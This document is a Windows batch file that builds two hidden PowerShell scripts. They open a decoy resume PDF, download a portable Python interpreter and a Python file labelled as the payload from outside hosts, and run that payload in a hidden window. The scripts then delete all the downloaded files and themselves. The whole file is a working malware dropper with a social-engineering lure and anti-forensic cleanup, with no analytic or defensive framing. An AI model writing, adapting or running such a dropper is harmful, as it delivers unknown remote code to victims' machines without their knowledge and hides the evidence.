@echo off

REM Create PowerShell script
echo $ProgressPreference='SilentlyContinue' > "%temp%\run.ps1"
echo Start-Process powershell -WindowStyle Hidden -ArgumentList '-File',"%temp%\exec.ps1" >> "%temp%\run.ps1"

REM Create execution script
(
echo $ProgressPreference='SilentlyContinue'
echo.
echo # Open PDF
echo Invoke-WebRequest -Uri 'https://github.com/workspacehome0/download/raw/main/FakeResume.pdf' -OutFile $env:temp\doc.pdf -UseBasicParsing
echo Start-Process $env:temp\doc.pdf
echo Start-Sleep -Seconds 2
echo.
echo # Download Python
echo Invoke-WebRequest -Uri 'https://staging.derideal.com/wp-content/app/python-portable.zip' -OutFile $env:temp\py.zip -UserAgent 'Mozilla/5.0' -UseBasicParsing
echo Start-Sleep -Seconds 2
echo.
echo # Extract Python
echo Expand-Archive -Path $env:temp\py.zip -DestinationPath $env:temp\py -Force
echo Start-Sleep -Seconds 2
echo.
echo # Download payload
echo Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/workspacehome0/download/refs/heads/main/user.py' -OutFile $env:temp\user.py -UseBasicParsing
echo.
echo # Run payload hidden
echo if ^(Test-Path $env:temp\py\python.exe^) {
echo     Start-Process -WindowStyle Hidden $env:temp\py\python.exe -ArgumentList $env:temp\user.py
echo }
echo.
echo # Cleanup after delay
echo Start-Sleep -Seconds 15
echo Remove-Item $env:temp\py.zip -Force -ErrorAction SilentlyContinue
echo Remove-Item $env:temp\user.py -Force -ErrorAction SilentlyContinue
echo Remove-Item $env:temp\doc.pdf -Force -ErrorAction SilentlyContinue
echo Remove-Item $env:temp\run.ps1 -Force -ErrorAction SilentlyContinue
echo Remove-Item $env:temp\exec.ps1 -Force -ErrorAction SilentlyContinue
echo Remove-Item -Recurse -Force $env:temp\py -ErrorAction SilentlyContinue
) > "%temp%\exec.ps1"

REM Run invisibly
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%temp%\run.ps1"

exit
